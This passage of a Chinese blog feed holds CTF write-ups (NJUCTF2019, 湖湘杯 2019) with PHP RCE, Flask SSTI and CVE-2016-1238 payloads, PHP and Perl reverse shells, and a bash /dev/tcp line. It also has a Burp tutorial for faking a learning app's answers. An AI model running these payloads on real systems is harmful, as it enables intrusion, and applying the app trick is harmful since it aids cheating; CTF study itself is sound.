alt="image-20200304212713261"></p><h2 id="2-手机修改代理服务器"><a href="#2-手机修改代理服务器" class="headerlink" title="2.手机修改代理服务器"></a>2.手机修改代理服务器</h2><p>手机修改wifi下的代理服务器，这里我本机局域网ip为172.20.16.107</p><p>所以我设置代理为172.20.16.107:8080</p><p>如图:</p><p><img src="/images/image-20200304212848065.png" alt="image-20200304212848065"></p><p>不知道自己的ip可以去路由器管理界面看，或者使用cmd命令ipconfig获取，其他方法也可以，无限制。</p><p>设置好后把proxy的拦截关掉</p><p><img src="/images/image-20200304212915940.png" alt="image-20200304212915940"></p><p>接下来http history会走过远远不断的流数据。</p><h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><p>我这里用<strong>词达人</strong>的某个自学任务测试</p><p>设置学习模式为快速模式(哈哈哈)</p><p><strong>选择所有单词</strong>后开始学习，第一类型题掠过，直接继续即可  <em>不怕麻烦可以少选几个，也没关系哈哈哈</em></p><p>再多说一嘴，就是这个第一个类型题也就是单纯为你朗读单词这个，是不算分数的。</p><p><img src="/images/image-20200304213348899.png" alt="image-20200304213348899"></p><p>到达此页面即可看到HTTP HISTORY最后一条<strong>POST</strong>的response</p><p><img src="/images/image-20200304213706254.png" alt="image-20200304213706254"></p><p>可以看到这里有answer:true的对应选项就是正确答案。<strong>不要着急选择</strong></p><p>进入options选项卡（不是user options，也就是我第一个图的地方）</p><p>下滑找到</p><p><img src="/images/image-20200304213940822.png" alt="image-20200304213940822"></p><p>点击Add按钮。</p><p>type选择response body也就是修改响应包的报文。</p><p><img src="/images/image-20200304214048764.png" alt="image-20200304214048764"></p><p>这里去手机那里选完答案点击继续。</p><p>下一题你就随便点击选项就可以了。</p><p><img src="/images/image-20200304214311276.png" alt="image-20200304214311276"></p><p>发现所有选项后面都带有小星星 ，就是修改成功了。</p><h1 id="收工"><a href="#收工" class="headerlink" title="收工"></a>收工</h1><h2 id="代理选择-无-即可"><a href="#代理选择-无-即可" class="headerlink" title="代理选择: 无 即可"></a>代理选择: 无 即可</h2><p><img src="/images/image-20200304214517300.png" alt="image-20200304214517300"></p><h2 id="然后关闭burp"><a href="#然后关闭burp" class="headerlink" title="然后关闭burp"></a>然后关闭burp</h2><p>感谢支持！</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>词达人</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NJUCTF2019-部分wp</title>
    <link href="/2019/11/24/NJUCTF2019.html"/>
    <url>/2019/11/24/NJUCTF2019.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然拿了一血但是是靠手速哈哈。</p><h1 id="web-replace"><a href="#web-replace" class="headerlink" title="web-replace"></a>web-replace</h1><p>既然这么出了一定是考replace.</p><p><img src="/images/image-20191124193302903.png" alt="image-20191124193302903"></p><p>提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。</p><p>首页三个框框:<img src="/images/image-20191124193404646.png" alt="image-20191124193404646"></p><p>目测是对应preg_replace 三个参数。</p><p> <code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code> </p><p>总的来说就是: <code>preg_replace(‘原来的文本’,‘替换的单词’,‘新单词’)</code></p><p>那么构造payload: <code>sub=jesen666&amp;pat=.*&amp;rep=eval($_POST[a])&amp;a=system(&#39;cat /flag&#39;);</code></p><p>post过去即可。。</p><h1 id="web-flask"><a href="#web-flask" class="headerlink" title="web-flask"></a>web-flask</h1><p>这题过于简单。。<img src="/images/image-20191124193919224.png" alt="image-20191124193919224"></p><p>进门这个点击以后看看，<img src="/images/image-20191124193932138.png" alt="image-20191124193932138"></p><p>修改以下url:<img src="/images/image-20191124193949934.png" alt="image-20191124193949934"></p><p>漏洞已经出现，这里直接放出payload。毕竟原理在网上已经有。</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">http://nctf2019.x1ct34m.com:<span class="hljs-number">40007</span>/base1&#123;&#123;request[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].__base__.__base__.__base__[<span class="hljs-string">&#x27;__subcla&#x27;</span>+<span class="hljs-string">&#x27;sses__&#x27;</span>]()[<span class="hljs-number">60</span>][<span class="hljs-string">&#x27;__in&#x27;</span>+<span class="hljs-string">&#x27;it__&#x27;</span>][<span class="hljs-string">&#x27;__&#x27;</span>+<span class="hljs-string">&#x27;glo&#x27;</span>+<span class="hljs-string">&#x27;bal&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>][<span class="hljs-string">&#x27;__bu&#x27;</span>+<span class="hljs-string">&#x27;iltins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="hljs-string">&#x27;pen(&quot;cat /f&quot;+&quot;lag&quot;).re&#x27;</span>+<span class="hljs-string">&#x27;ad()&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>这里注意它过滤了flag字符，所以需要拆开flag后用+链接。。。</p><h1 id="web-hacker-backdoor"><a href="#web-hacker-backdoor" class="headerlink" title="web-hacker_backdoor"></a>web-hacker_backdoor</h1><p>给出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-variable">$usrful</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$dangerous</span> = <span class="hljs-title function_ invoke__">get_defined_functions</span>();<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>], <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$bad</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$bad</span>) !== <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> False;<br>        <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> True;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$usrful</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh,不能输入这些函数哦 :) &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析以下：需要get传入code和useful参数，useful参数需要是系统已经存在的文件。这里使用file:///etc/passwd</p><p>$dangerous数组，把内置函数全部取出，并加入eval和assert来阻止执行。</p><h2 id="研究绕过"><a href="#研究绕过" class="headerlink" title="研究绕过"></a>研究绕过</h2><p>这里我们可以在网上百度得到strpos一般是用数组绕过的,但是我在做题时候发现，我没有成功，紧接着查阅php.net文档，发现strpos是大小写敏感的。</p><p>那么就简单了。构造  <code>/?code=PhPinfO();&amp;useful=file:///etc/passwd</code>成功绕过。</p><h2 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h2><p>发现禁用了大多数函数，但是没有禁用fsockopen,proc_close和proc_open,那么完全可以反弹shell。</p><p>反弹代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sock</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<span class="hljs-string">&#x27;xxx&#x27;</span>);<span class="hljs-comment">//ip and port</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span>);<br><span class="hljs-variable">$process</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br></code></pre></td></tr></table></figure><p>构造payload：<code>/?code=EVAL($_GET[a]);&amp;useful=file:///etc/passwd&amp;a=$sock=fsockopen(&#39;xx&#39;,&#39;xxxxx&#39;);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process=proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);</code></p><p>这里为了观赏性，a是urldecode之后的，在利用的时候需要使用urlencode。</p><h1 id="misc-pip-install"><a href="#misc-pip-install" class="headerlink" title="misc-pip install"></a>misc-pip install</h1><p>官方给了个命令让安装<code>pip install --user nctf-2019-installme</code></p><p>果断安装，安装后发现源码只有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Believe it or not. Flag is already in your machine. Can you find it?&#x27;</span><br></code></pre></td></tr></table></figure><p>那么只能去pypi官网，去官网查找<code>nctf-2019-installme</code>包，下载zip源码。在setup.py中发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages<br><span class="hljs-keyword">import</span> tempfile<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> path, system<br><br>tmp_file = tempfile.gettempdir() + path.sep + <span class="hljs-string">&#x27;.f14g_is_here&#x27;</span><br>f = <span class="hljs-built_in">open</span>(tmp_file, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9&#x27;</span>)<br>f.close()<br><br><span class="hljs-comment"># system(&#x27;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1&#x27;)</span><br><span class="hljs-comment"># Ohhhh, that a joke. I won&#x27;t do that. </span><br><br>setup(<br>    name=<span class="hljs-string">&#x27;nctf_2019_installme&#x27;</span>,<br>    version=<span class="hljs-number">0.2</span>,<br>    description=(<br>        <span class="hljs-string">&#x27;Get flagggggggggg!&#x27;</span><br>    ),<br>    author=<span class="hljs-string">&#x27;rmb122&#x27;</span>,<br>    author_email=<span class="hljs-string">&#x27;abuse@anti-spam.cn&#x27;</span>,<br>    license=<span class="hljs-string">&#x27;GPLv3.0&#x27;</span>,<br>    packages=find_packages(),<br>    platforms=[<span class="hljs-string">&quot;all&quot;</span>],<br>    keywords=[<span class="hljs-string">&#x27;nctf&#x27;</span>, <span class="hljs-string">&#x27;getflag&#x27;</span>],<br>    url=<span class="hljs-string">&#x27;http://www.google.com&#x27;</span><br>)<br></code></pre></td></tr></table></figure><p>解码base64<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>即可得到flag.</p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>还是很难的（对于我这种萌新来说），最可惜的结束phar那道题，有反序列化，但是没有找到对应的危险类，只有一个孤零零的curl。。。。静等赛后官方wp。唉唉唉。。。</p><p>但是。。。我很开心 哈哈哈。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>南京邮电CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>湖湘杯2019 web1-UNTAR writeup</title>
    <link href="/2019/11/09/hxbctf-2019.html"/>
    <url>/2019/11/09/hxbctf-2019.html</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-观察源码"><a href="#0x01-观察源码" class="headerlink" title="0x01 观察源码"></a>0x01 观察源码</h1><p><img src="/images/image-20191109220539708.png" alt="image-20191109220539708"></p><p>观察源码，</p><p>反正我看完心情就是这样:<img src="/images/image-20191109220630610.png" alt="image-20191109220630610"></p><h1 id="0x02-分析与操作"><a href="#0x02-分析与操作" class="headerlink" title="0x02 分析与操作"></a>0x02 分析与操作</h1><p>切回正题，发现php针对每个ip进行md5加密之后把httpGET到的文件存入sandbox/md5(ip)中，如果可以untar就进行untar操作。</p><p>注意函数<code>escapeshellarg()</code> 基本上已经告别了|，&amp;&amp;，;之类的rce了。</p><p>将目光放入untar操作，要知道，tar是可以压缩软连接文件的，</p><p>也就是说我们在linux中我们进行<code>ln -s / jesen</code> 操作，我<code>cd jesen</code>就相当于<code>cd /</code></p><p>将jesen压缩：<code>tar zvf jesen.tar jesen</code> (本命令纯属回忆没测试)</p><p>压缩之后payload:<code>GET /index.php?url=http://someip:port/jesen.tar&amp;filename=jesen.txt</code></p><p>发现sandbox对应文件夹下多出j文件夹，访问j文件夹，点击flag，发现提示403 Forbidden，应该是出题人限制了权限，唉。</p><p>这里提一下，之前其实进行了很多次尝试，并且搞崩了web服务器两次+ ，主办方并没有用docker，所以好多人都被我卡了哈哈。</p><p>php在sandbox目录无法解析，但是在尝试过程中，曾经把<code>/var/www/html</code>给软连接了，看了一下其他人的进度，发现有一队成功执行了php 不知道什么情况。</p><h2 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h2><p>经历一番波折，参考： <a href="http://momomoxiaoxi.com/2017/11/08/HITCON/">http://momomoxiaoxi.com/2017/11/08/HITCON/</a>  moxiaoxi师傅博客好多好东西哈哈</p><p>题目的考点就是CVE-2016-1238.在URI/lib/URi.pm 136行，有一个<code>eval &quot;require $ic&quot;;</code>语句，当解析遇到一个未定义的协议时，会require这个未知协议。而require的时候，perl脚本会自动搜索当下目录和perl库目录来导入以.pm结尾的模块。</p><p>漏洞代码如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs perl">$ic = <span class="hljs-string">&quot;URI::$scheme&quot;</span>;  <span class="hljs-comment"># default location</span><br><span class="hljs-comment"># turn scheme into a valid perl identifier by a simple transformation...</span><br>$ic =~ <span class="hljs-regexp">s/\+/_P/g</span>;<br>$ic =~ <span class="hljs-regexp">s/\./_O/g</span>;<br>$ic =~ <span class="hljs-regexp">s/\-/_/g</span>;<br><span class="hljs-keyword">no</span> strict <span class="hljs-string">&#x27;refs&#x27;</span>;<br><span class="hljs-comment"># check we actually have one for the scheme:</span><br><span class="hljs-keyword">unless</span> (@&#123;<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ic&#125;</span>::ISA&quot;</span>&#125;) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> $require_attempted&#123;$ic&#125;) &#123;<br>        <span class="hljs-comment"># Try to load it</span><br>        <span class="hljs-keyword">my</span> $_old_error = $@;<br>        <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;require $ic&quot;</span>;<br>        <span class="hljs-keyword">die</span> $@ <span class="hljs-keyword">if</span> $@ &amp;&amp; $@ !~ <span class="hljs-regexp">/Can\&#x27;t locate.*in \@INC/</span>;<br>        $@ = $_old_error;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">undef</span> <span class="hljs-keyword">unless</span> @&#123;<span class="hljs-string">&quot;<span class="hljs-subst">$&#123;ic&#125;</span>::ISA&quot;</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以，我们先找一个perl的后门：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl -w</span><br><span class="hljs-comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-keyword">use</span> FileHandle;<br><span class="hljs-keyword">use</span> POSIX;<br><span class="hljs-keyword">my</span> $VERSION = <span class="hljs-string">&quot;1.0&quot;</span>;<br><br><span class="hljs-comment"># Where to send the reverse shell. Change these.</span><br><span class="hljs-keyword">my</span> $ip = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-keyword">my</span> $port = <span class="hljs-number">1234</span>;<br><br><span class="hljs-comment"># Options</span><br><span class="hljs-keyword">my</span> $daemon = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">my</span> $auth   = <span class="hljs-number">0</span>; <span class="hljs-comment"># 0 means authentication is disabled and any </span><br>        <span class="hljs-comment"># source IP can access the reverse shell</span><br><span class="hljs-keyword">my</span> $authorised_client_pattern = <span class="hljs-regexp">qr(^127\.0\.0\.1$)</span>;<br><br><span class="hljs-comment"># Declarations</span><br><span class="hljs-keyword">my</span> $global_page = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">my</span> $fake_process_name = <span class="hljs-string">&quot;/usr/sbin/apache&quot;</span>;<br><br><span class="hljs-comment"># Change the process name to be less conspicious</span><br>$0 = <span class="hljs-string">&quot;[httpd]&quot;</span>;<br><br><span class="hljs-comment"># Authenticate based on source IP address if required</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">defined</span>($ENV&#123;<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>&#125;)) &#123;<br>    cgiprint(<span class="hljs-string">&quot;Browser IP address appears to be: $ENV&#123;&#x27;REMOTE_ADDR&#x27;&#125;&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ($auth) &#123;<br>        <span class="hljs-keyword">unless</span> ($ENV&#123;<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>&#125; =~ $authorised_client_pattern) &#123;<br>            cgiprint(<span class="hljs-string">&quot;ERROR: Your client isn&#x27;t authorised to view this page&quot;</span>);<br>            cgiexit();<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">elsif</span> ($auth) &#123;<br>    cgiprint(<span class="hljs-string">&quot;ERROR: Authentication is enabled, but I couldn&#x27;t determine your IP address. Denying access&quot;</span>);<br>    cgiexit(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment"># Background and dissociate from parent process if required</span><br><span class="hljs-keyword">if</span> ($daemon) &#123;<br>    <span class="hljs-keyword">my</span> $pid = <span class="hljs-keyword">fork</span>();<br>    <span class="hljs-keyword">if</span> ($pid) &#123;<br>        cgiexit(<span class="hljs-number">0</span>); <span class="hljs-comment"># parent exits</span><br>    &#125;<br><br>    setsid();<br>    <span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-keyword">umask</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment"># Make TCP connection for reverse shell</span><br><span class="hljs-keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&#x27;tcp&#x27;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;<br>    cgiprint(<span class="hljs-string">&quot;Sent reverse shell to $ip:$port&quot;</span>);<br>    cgiprintpage();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    cgiprint(<span class="hljs-string">&quot;Couldn&#x27;t open reverse shell to $ip:$port: $!&quot;</span>);<br>    cgiexit();    <br>&#125;<br><br><span class="hljs-comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span><br><span class="hljs-keyword">open</span>(STDIN, <span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br><span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br><span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;SOCK&quot;</span>);<br>$ENV&#123;<span class="hljs-string">&#x27;HISTFILE&#x27;</span>&#125; = <span class="hljs-string">&#x27;/dev/null&#x27;</span>;<br><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;w;uname -a;id;pwd&quot;</span>);<br><span class="hljs-keyword">exec</span>(&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>&#125; ($fake_process_name, <span class="hljs-string">&quot;-i&quot;</span>));<br><br><span class="hljs-comment"># Wrapper around print</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiprint</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $line = <span class="hljs-keyword">shift</span>;<br>    $line .= <span class="hljs-string">&quot;&lt;p&gt;\n&quot;</span>;<br>    $global_page .= $line;<br>&#125;<br><br><span class="hljs-comment"># Wrapper around exit</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiexit</span> </span>&#123;<br>    cgiprintpage();<br>    <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>; <span class="hljs-comment"># 0 to ensure we don&#x27;t give a 500 response.</span><br>&#125;<br><br><span class="hljs-comment"># Form HTTP response using all the messages gathered by cgiprint so far</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">cgiprintpage</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-keyword">length</span>($global_page) . <span class="hljs-string">&quot;\r Connection: close\r Content-Type: text\/html\r\n\r\n&quot;</span> . $global_page;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，将其部署到服务器上（反弹ip改为我们服务器的ip）。</p><p>payload:<code>GET index.php?filename=URI/jesen.pm&amp;url=http://xx.xx.xx.x/jesen.pm</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Html">http://xx/index.php?filename=URI/jesen.pm&amp;url=http://xx.xx.xx.x/jesen.pm<br>└── sandbox<br>    └── xxxxxxxxxxxxxxxxxxxxxxxxxx<br>        └── URI<br>            └── jesen.pm<br></code></pre></td></tr></table></figure><p>这样就在网站上新建了一个URI目录，目录下有jesen.pm文件，文件内容为我们的backdoor。</p><p>在服务器上监听端口，再访问<code>http://xx/index.php?filename=xxx&amp;url=jesen://jesen666</code>就能获得一个反弹shell。这里访问<code>jesen://jesen666</code>时，<code>jesen</code>是未定义模块，所以会自动搜索并加载URI中的<code>jesen.pm</code> 模块。</p><p>这里回到.php源码我们发现，源码对url进行了限制，只能以<code>http/https</code>开头，所以我们使用短链接，</p><p>将<code>jesen://jesen666</code>转为短链接即可，</p><p>所以最后payload为:<code>index.php?filename=随意&amp;url=短链接地址</code></p><p>然后成功反弹shell，执行./readflag 即可获得flag <code>flag&#123;c3aa64ff011a32eca10c95de2200e12f&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分块传输tamper</title>
    <link href="/2019/11/07/chunk_tamper.html"/>
    <url>/2019/11/07/chunk_tamper.html</url>
    
